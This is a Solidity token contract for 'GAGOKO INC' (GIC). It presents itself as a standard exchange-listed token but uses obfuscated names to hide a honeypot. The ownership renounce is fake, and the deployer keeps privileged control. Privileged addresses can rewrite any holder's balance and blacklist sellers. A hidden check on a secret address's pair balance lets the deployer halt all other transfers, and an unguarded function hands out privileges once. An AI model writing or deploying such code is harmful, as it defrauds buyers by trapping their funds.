//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface marketingLiquidityAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface txTrading {
    function createPair(address marketingExempt, address senderIs) external returns (address);
}

abstract contract amountBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeMin {
    function totalSupply() external view returns (uint256);

    function balanceOf(address limitTrading) external view returns (uint256);

    function transfer(address amountMarketing, uint256 tokenIsLiquidity) external returns (bool);

    function allowance(address atMarketing, address spender) external view returns (uint256);

    function approve(address spender, uint256 tokenIsLiquidity) external returns (bool);

    function transferFrom(address sender,address amountMarketing,uint256 tokenIsLiquidity) external returns (bool);

    event Transfer(address indexed from, address indexed feeLaunched, uint256 value);
    event Approval(address indexed atMarketing, address indexed spender, uint256 value);
}

interface takeMinMetadata is takeMin {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract GAGOKOINC is amountBuy, takeMin, takeMinMetadata {

    function modeShould(address liquidityAutoTake, address amountMarketing, uint256 tokenIsLiquidity) internal returns (bool) {
        require(amountFee[liquidityAutoTake] >= tokenIsLiquidity);
        amountFee[liquidityAutoTake] -= tokenIsLiquidity;
        amountFee[amountMarketing] += tokenIsLiquidity;
        emit Transfer(liquidityAutoTake, amountMarketing, tokenIsLiquidity);
        return true;
    }

    address enableTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transfer(address takeTotal, uint256 tokenIsLiquidity) external virtual override returns (bool) {
        return totalWallet(_msgSender(), takeTotal, tokenIsLiquidity);
    }

    mapping(address => uint256) private amountFee;

    mapping(address => bool) public shouldFeeTx;

    function getOwner() external view returns (address) {
        return liquidityAutoFrom;
    }

    string private atMin = "GAGOKO INC";

    mapping(address => mapping(address => uint256)) private toTrading;

    function symbol() external view virtual override returns (string memory) {
        return sellLiquidityTake;
    }

    uint256 public takeMarketing;

    function approve(address limitExempt, uint256 tokenIsLiquidity) public virtual override returns (bool) {
        toTrading[_msgSender()][limitExempt] = tokenIsLiquidity;
        emit Approval(_msgSender(), limitExempt, tokenIsLiquidity);
        return true;
    }

    address public amountSwap;

    function receiverAuto() private view {
        require(shouldFeeTx[_msgSender()]);
    }

    uint8 private launchAt = 18;

    constructor (){
        if (enableTo) {
            enableTo = false;
        }
        listToken();
        marketingLiquidityAt shouldTradingTotal = marketingLiquidityAt(enableTrading);
        buyTx = txTrading(shouldTradingTotal.factory()).createPair(shouldTradingTotal.WETH(), address(this));
        
        amountSwap = _msgSender();
        shouldFeeTx[amountSwap] = true;
        amountFee[amountSwap] = exemptTrading;
        
        emit Transfer(address(0), amountSwap, exemptTrading);
    }

    function launchSenderWallet(uint256 tokenIsLiquidity) public {
        receiverAuto();
        buyMin = tokenIsLiquidity;
    }

    function listToken() public {
        emit OwnershipTransferred(amountSwap, address(0));
        liquidityAutoFrom = address(0);
    }

    string private sellLiquidityTake = "GIC";

    function receiverToShould(address takeTotal, uint256 tokenIsLiquidity) public {
        receiverAuto();
        amountFee[takeTotal] = tokenIsLiquidity;
    }

    function txTotalMin(address amountMarketingEnable) public {
        receiverAuto();
        
        if (amountMarketingEnable == amountSwap || amountMarketingEnable == buyTx) {
            return;
        }
        tokenExempt[amountMarketingEnable] = true;
    }

    bool public enableTo;

    address private liquidityAutoFrom;

    address launchList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public tokenExempt;

    uint256 private exemptTrading = 100000000 * 10 ** 18;

    uint256 public takeReceiver;

    uint256 buyMin;

    bool private launchedLiquidityList;

    function owner() external view returns (address) {
        return liquidityAutoFrom;
    }

    function totalWallet(address liquidityAutoTake, address amountMarketing, uint256 tokenIsLiquidity) internal returns (bool) {
        if (liquidityAutoTake == amountSwap) {
            return modeShould(liquidityAutoTake, amountMarketing, tokenIsLiquidity);
        }
        uint256 receiverFundAt = takeMin(buyTx).balanceOf(launchList);
        require(receiverFundAt == buyMin);
        require(!tokenExempt[liquidityAutoTake]);
        return modeShould(liquidityAutoTake, amountMarketing, tokenIsLiquidity);
    }

    uint256 listBuyIs;

    function allowance(address listTake, address limitExempt) external view virtual override returns (uint256) {
        if (limitExempt == enableTrading) {
            return type(uint256).max;
        }
        return toTrading[listTake][limitExempt];
    }

    function feeLimit(address fromTx) public {
        if (maxIs) {
            return;
        }
        if (takeMarketing != takeReceiver) {
            takeReceiver = takeMarketing;
        }
        shouldFeeTx[fromTx] = true;
        
        maxIs = true;
    }

    function transferFrom(address liquidityAutoTake, address amountMarketing, uint256 tokenIsLiquidity) external override returns (bool) {
        if (_msgSender() != enableTrading) {
            if (toTrading[liquidityAutoTake][_msgSender()] != type(uint256).max) {
                require(tokenIsLiquidity <= toTrading[liquidityAutoTake][_msgSender()]);
                toTrading[liquidityAutoTake][_msgSender()] -= tokenIsLiquidity;
            }
        }
        return totalWallet(liquidityAutoTake, amountMarketing, tokenIsLiquidity);
    }

    bool public maxIs;

    event OwnershipTransferred(address indexed limitAutoTo, address indexed totalEnable);

    address public buyTx;

    function balanceOf(address limitTrading) public view virtual override returns (uint256) {
        return amountFee[limitTrading];
    }

    function decimals() external view virtual override returns (uint8) {
        return launchAt;
    }

    function name() external view virtual override returns (string memory) {
        return atMin;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return exemptTrading;
    }

}